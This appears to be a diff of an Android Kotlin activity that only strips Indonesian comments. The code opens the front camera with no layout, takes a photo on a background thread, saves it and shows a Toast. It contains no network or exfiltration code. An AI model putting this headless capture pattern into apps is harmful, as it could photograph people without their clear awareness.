@@ -21,7 +21,6 @@ class CameraCaptureActivity : Activity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // Jangan set layout apapun karena tidak ada UI yang perlu ditampilkan
 
         if (checkPermissions()) {
             setupCamera()
@@ -52,7 +51,6 @@ class CameraCaptureActivity : Activity() {
 
     private fun setupCamera() {
         try {
-            // Menggunakan kamera depan (Camera API yang lama)
             val cameraCount = Camera.getNumberOfCameras()
             var frontCameraId: Int? = null
 
@@ -68,13 +66,10 @@ class CameraCaptureActivity : Activity() {
             if (frontCameraId != null) {
                 camera = Camera.open(frontCameraId)
                 val parameters = camera?.parameters
-                //parameters?.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO) // Fokus otomatis
                 camera?.parameters = parameters
 
-                // Mulai preview kamera (walaupun tidak akan ditampilkan di UI)
                 camera?.startPreview()
 
-                // Ambil gambar langsung setelah setup selesai
                 takePictureInBackground()
 
             } else {
@@ -86,9 +81,8 @@ class CameraCaptureActivity : Activity() {
         }
     }
 
-    // Menangkap gambar dan menyimpannya ke penyimpanan
+
     private fun takePictureInBackground() {
-        // Menjalankan pengambilan gambar di thread background agar tidak mengganggu UI
         Thread {
             try {
                 camera?.takePicture(null, null, Camera.PictureCallback { data, _ ->
@@ -104,7 +98,6 @@ class CameraCaptureActivity : Activity() {
         val savedFile = saveImageToStorage(imageData)
         runOnUiThread {
             savedFile?.let {
-                // Menampilkan pesan Toast hanya untuk konfirmasi, jika diperlukan
                 Toast.makeText(this@CameraCaptureActivity, "Image saved at: ${it.absolutePath}", Toast.LENGTH_SHORT).show()
                 finish()
             }
